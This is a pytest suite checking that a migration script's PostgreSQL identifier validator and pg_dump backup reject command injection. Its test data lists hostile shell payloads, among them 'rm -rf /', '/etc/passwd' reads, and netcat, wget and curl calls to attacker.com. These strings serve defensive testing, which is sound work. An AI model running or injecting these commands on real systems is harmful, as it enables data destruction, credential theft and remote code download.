"""
Security tests for Database Migration Script - Command Injection Prevention
Tests the fix for CRIT-NEW-1: Command Injection in Database Migration Script
"""

import pytest
import os
from unittest.mock import patch, MagicMock, call
from pathlib import Path
import sys

# Add backend to path for imports
sys.path.insert(0, str(Path(__file__).parent.parent.parent.parent / "backend"))

from run_migrations import validate_postgres_identifier, MigrationRunner


class TestValidatePostgresIdentifier:
    """Test suite for validate_postgres_identifier function"""

    def test_valid_hostname(self):
        """Test that valid hostnames pass validation"""
        valid_hostnames = [
            "localhost",
            "db.example.com",
            "postgres-01",
            "192.168.1.1",
            "db_server",
            "prod-db-1.us-east-1.rds.amazonaws.com"
        ]

        for hostname in valid_hostnames:
            result = validate_postgres_identifier(hostname, "hostname")
            assert result == hostname

    def test_valid_username(self):
        """Test that valid usernames pass validation"""
        valid_usernames = [
            "postgres",
            "admin",
            "user_123",
            "finops-user",
            "db.admin"
        ]

        for username in valid_usernames:
            result = validate_postgres_identifier(username, "username")
            assert result == username

    def test_valid_database_name(self):
        """Test that valid database names pass validation"""
        valid_databases = [
            "finops_db",
            "production",
            "test-database",
            "db_2024"
        ]

        for database in valid_databases:
            result = validate_postgres_identifier(database, "database")
            assert result == database

    def test_empty_value_rejected(self):
        """Test that empty values are rejected"""
        with pytest.raises(ValueError) as exc_info:
            validate_postgres_identifier("", "hostname")

        assert "cannot be empty" in str(exc_info.value)

    def test_none_value_rejected(self):
        """Test that None values are rejected"""
        with pytest.raises((ValueError, TypeError)):
            validate_postgres_identifier(None, "hostname")

    def test_semicolon_injection_blocked(self):
        """Test that semicolon injection attempts are blocked"""
        malicious_values = [
            "user;touch /tmp/pwned",
            "localhost;rm -rf /",
            "db;whoami",
            "test;id;",
        ]

        for malicious_value in malicious_values:
            with pytest.raises(ValueError) as exc_info:
                validate_postgres_identifier(malicious_value, "hostname")

            assert "disallowed characters" in str(exc_info.value)

    def test_command_substitution_blocked(self):
        """Test that command substitution attempts are blocked"""
        malicious_values = [
            "$(whoami)",
            "`id`",
            "${USER}",
            "$(cat /etc/passwd)",
        ]

        for malicious_value in malicious_values:
            with pytest.raises(ValueError) as exc_info:
                validate_postgres_identifier(malicious_value, "database")

            assert "disallowed characters" in str(exc_info.value)

    def test_pipe_injection_blocked(self):
        """Test that pipe injection attempts are blocked"""
        malicious_values = [
            "user|cat /etc/passwd",
            "localhost||whoami",
            "db|nc attacker.com 4444",
        ]

        for malicious_value in malicious_values:
            with pytest.raises(ValueError) as exc_info:
                validate_postgres_identifier(malicious_value, "username")

            assert "disallowed characters" in str(exc_info.value)

    def test_redirect_injection_blocked(self):
        """Test that redirect injection attempts are blocked"""
        malicious_values = [
            "user>output.txt",
            "localhost>>log.txt",
            "db<input.txt",
        ]

        for malicious_value in malicious_values:
            with pytest.raises(ValueError) as exc_info:
                validate_postgres_identifier(malicious_value, "database")

            assert "disallowed characters" in str(exc_info.value)

    def test_ampersand_background_blocked(self):
        """Test that background execution attempts are blocked"""
        malicious_values = [
            "user&",
            "localhost&&whoami",
            "db&& echo pwned",
        ]

        for malicious_value in malicious_values:
            with pytest.raises(ValueError) as exc_info:
                validate_postgres_identifier(malicious_value, "hostname")

            assert "disallowed characters" in str(exc_info.value)

    def test_newline_injection_blocked(self):
        """Test that newline injection attempts are blocked"""
        malicious_values = [
            "user\ntouch /tmp/pwned",
            "localhost\r\nwhoami",
            "db\nid",
        ]

        for malicious_value in malicious_values:
            with pytest.raises(ValueError) as exc_info:
                validate_postgres_identifier(malicious_value, "database")

            assert "disallowed characters" in str(exc_info.value)

    def test_space_injection_blocked(self):
        """Test that spaces are blocked (spaces can enable multi-command injection)"""
        malicious_values = [
            "user touch /tmp/pwned",
            "localhost whoami",
            "db id",
        ]

        for malicious_value in malicious_values:
            with pytest.raises(ValueError) as exc_info:
                validate_postgres_identifier(malicious_value, "hostname")

            assert "disallowed characters" in str(exc_info.value)

    def test_quote_injection_blocked(self):
        """Test that quote injection attempts are blocked"""
        malicious_values = [
            "user'--",
            'db"test',
            "localhost'||'1'='1",
        ]

        for malicious_value in malicious_values:
            with pytest.raises(ValueError) as exc_info:
                validate_postgres_identifier(malicious_value, "database")

            assert "disallowed characters" in str(exc_info.value)

    def test_length_limit_enforced(self):
        """Test that PostgreSQL 63-character identifier limit is enforced"""
        # 64 characters - should fail
        too_long = "a" * 64

        with pytest.raises(ValueError) as exc_info:
            validate_postgres_identifier(too_long, "hostname")

        assert "exceeds maximum length" in str(exc_info.value)

        # 63 characters - should pass
        max_length = "a" * 63
        result = validate_postgres_identifier(max_length, "hostname")
        assert result == max_length

    def test_special_shell_characters_blocked(self):
        """Test that all dangerous shell metacharacters are blocked"""
        dangerous_chars = [
            "!", "@", "#", "$", "%", "^", "&", "*", "(", ")",
            "[", "]", "{", "}", "\\", "/", "?", "<", ">", ":",
            ";", "'", '"', "`", "~", " ", "\t", "\n", "\r"
        ]

        for char in dangerous_chars:
            test_value = f"test{char}value"
            with pytest.raises(ValueError):
                validate_postgres_identifier(test_value, "test")

    def test_path_traversal_blocked(self):
        """Test that path traversal attempts are blocked"""
        malicious_values = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32",
            "/etc/passwd",
            "\\etc\\passwd",
        ]

        for malicious_value in malicious_values:
            with pytest.raises(ValueError) as exc_info:
                validate_postgres_identifier(malicious_value, "database")

            # Should fail due to / or \
            assert "disallowed characters" in str(exc_info.value)


class TestMigrationRunnerSecurity:
    """Test suite for MigrationRunner backup_database security"""

    @pytest.fixture
    def runner(self):
        """Create a MigrationRunner instance for testing"""
        return MigrationRunner()

    @pytest.fixture
    def mock_subprocess(self, mocker):
        """Mock subprocess calls"""
        return mocker.patch("run_migrations.MigrationRunner.run_command")

    def test_safe_database_url_works(self, runner, mock_subprocess, tmp_path):
        """Test that a safe DATABASE_URL works correctly"""
        runner.script_dir = tmp_path
        (tmp_path / "backups").mkdir()

        mock_subprocess.return_value = (0, "", "")

        safe_url = "postgresql://postgres:password@localhost:5432/finops_db"

        with patch.dict(os.environ, {"DATABASE_URL": safe_url}):
            result = runner.backup_database()

        assert result is True
        # Verify pg_dump was called with properly escaped parameters
        mock_subprocess.assert_called_once()
        call_args = mock_subprocess.call_args[0][0]
        assert call_args[0] == "pg_dump"
        assert "-h" in call_args
        assert "-U" in call_args
        assert "-d" in call_args

    def test_semicolon_injection_in_username_blocked(self, runner, mock_subprocess, tmp_path):
        """Test that semicolon injection in username is blocked"""
        runner.script_dir = tmp_path
        (tmp_path / "backups").mkdir()

        malicious_url = "postgresql://user;touch /tmp/pwned@localhost:5432/db"

        with patch.dict(os.environ, {"DATABASE_URL": malicious_url}):
            with pytest.raises(ValueError) as exc_info:
                runner.backup_database()

            assert "disallowed characters" in str(exc_info.value)

        # Verify pg_dump was NEVER called
        mock_subprocess.assert_not_called()

    def test_command_injection_in_hostname_blocked(self, runner, mock_subprocess, tmp_path):
        """Test that command injection in hostname is blocked"""
        runner.script_dir = tmp_path
        (tmp_path / "backups").mkdir()

        malicious_url = "postgresql://user@$(whoami).com:5432/db"

        with patch.dict(os.environ, {"DATABASE_URL": malicious_url}):
            with pytest.raises(ValueError) as exc_info:
                runner.backup_database()

            assert "disallowed characters" in str(exc_info.value)

        mock_subprocess.assert_not_called()

    def test_command_injection_in_database_blocked(self, runner, mock_subprocess, tmp_path):
        """Test that command injection in database name is blocked"""
        runner.script_dir = tmp_path
        (tmp_path / "backups").mkdir()

        malicious_url = "postgresql://user@localhost:5432/db;whoami"

        with patch.dict(os.environ, {"DATABASE_URL": malicious_url}):
            with pytest.raises(ValueError) as exc_info:
                runner.backup_database()

            assert "disallowed characters" in str(exc_info.value)

        mock_subprocess.assert_not_called()

    def test_invalid_port_blocked(self, runner, mock_subprocess, tmp_path):
        """Test that invalid ports are blocked"""
        runner.script_dir = tmp_path
        (tmp_path / "backups").mkdir()

        invalid_ports = [
            "postgresql://user@localhost:abc/db",  # Non-numeric
            "postgresql://user@localhost:99999/db",  # Out of range
            "postgresql://user@localhost:-1/db",  # Negative
            "postgresql://user@localhost:0/db",  # Zero
        ]

        for malicious_url in invalid_ports:
            with patch.dict(os.environ, {"DATABASE_URL": malicious_url}):
                with pytest.raises(ValueError) as exc_info:
                    runner.backup_database()

                assert "port" in str(exc_info.value).lower()

            mock_subprocess.assert_not_called()

    def test_shlex_quote_applied_to_parameters(self, runner, mock_subprocess, tmp_path):
        """Test that shlex.quote is applied to all parameters"""
        runner.script_dir = tmp_path
        (tmp_path / "backups").mkdir()

        mock_subprocess.return_value = (0, "", "")

        # Use a database name with dots (valid but needs quoting)
        safe_url = "postgresql://postgres:password@db.example.com:5432/prod.db"

        with patch.dict(os.environ, {"DATABASE_URL": safe_url}):
            result = runner.backup_database()

        assert result is True

        # Verify the command was called with quoted parameters
        call_args = mock_subprocess.call_args[0][0]

        # Find indices of parameters
        h_idx = call_args.index("-h")
        u_idx = call_args.index("-U")
        d_idx = call_args.index("-d")

        # The values after flags should be quoted strings (single quotes added by shlex)
        hostname_arg = call_args[h_idx + 1]
        username_arg = call_args[u_idx + 1]
        database_arg = call_args[d_idx + 1]

        # shlex.quote() adds single quotes around strings with special chars
        # For safe strings, it may or may not add quotes, but they should not contain unescaped special chars
        assert ";" not in hostname_arg
        assert ";" not in username_arg
        assert ";" not in database_arg

    def test_empty_database_name_blocked(self, runner, mock_subprocess, tmp_path):
        """Test that empty database name is blocked"""
        runner.script_dir = tmp_path
        (tmp_path / "backups").mkdir()

        malicious_url = "postgresql://user@localhost:5432/"

        with patch.dict(os.environ, {"DATABASE_URL": malicious_url}):
            with pytest.raises(ValueError) as exc_info:
                runner.backup_database()

            assert "cannot be empty" in str(exc_info.value)

        mock_subprocess.assert_not_called()

    def test_no_database_url_skips_backup(self, runner, mock_subprocess, capsys):
        """Test that missing DATABASE_URL skips backup gracefully"""
        with patch.dict(os.environ, {}, clear=True):
            result = runner.backup_database()

        assert result is True  # Should return True to allow migration to continue
        captured = capsys.readouterr()
        assert "DATABASE_URL not set" in captured.out

        # pg_dump should not be called
        mock_subprocess.assert_not_called()

    def test_real_world_rds_url_works(self, runner, mock_subprocess, tmp_path):
        """Test that real-world AWS RDS URLs work correctly"""
        runner.script_dir = tmp_path
        (tmp_path / "backups").mkdir()

        mock_subprocess.return_value = (0, "", "")

        rds_url = "postgresql://finops_user:password@finops-prod.c9akl2xe7zyx.us-east-1.rds.amazonaws.com:5432/finops_production"

        with patch.dict(os.environ, {"DATABASE_URL": rds_url}):
            result = runner.backup_database()

        assert result is True
        mock_subprocess.assert_called_once()


class TestCommandInjectionRegressionTests:
    """Regression tests to ensure command injection protection stays in place"""

    def test_validation_function_exists(self):
        """Test that validate_postgres_identifier function exists"""
        from run_migrations import validate_postgres_identifier
        assert callable(validate_postgres_identifier)

    def test_shlex_import_exists(self):
        """Test that shlex is imported"""
        import run_migrations
        assert hasattr(run_migrations, "shlex")

    def test_re_import_exists(self):
        """Test that re module is imported"""
        import run_migrations
        assert hasattr(run_migrations, "re")

    def test_backup_method_uses_validation(self):
        """Test that backup_database method calls validation function"""
        import inspect
        from run_migrations import MigrationRunner

        source = inspect.getsource(MigrationRunner.backup_database)

        # Verify validation is used
        assert "validate_postgres_identifier" in source
        assert "hostname" in source
        assert "username" in source
        assert "database" in source

    def test_backup_method_uses_shlex_quote(self):
        """Test that backup_database method uses shlex.quote"""
        import inspect
        from run_migrations import MigrationRunner

        source = inspect.getsource(MigrationRunner.backup_database)

        # Verify shlex.quote is used
        assert "shlex.quote" in source

    def test_owasp_command_injection_payloads_blocked(self):
        """Test that common OWASP command injection payloads are blocked"""
        from run_migrations import validate_postgres_identifier

        # Common command injection payloads from OWASP
        owasp_payloads = [
            "user; cat /etc/passwd",
            "user & whoami",
            "user | nc attacker.com 4444",
            "user && wget http://attacker.com/malware",
            "user `whoami`",
            "user $(curl http://attacker.com)",
            "user\nwhoami",
            "user || id",
            "user ; rm -rf /",
        ]

        for payload in owasp_payloads:
            with pytest.raises(ValueError):
                validate_postgres_identifier(payload, "test")
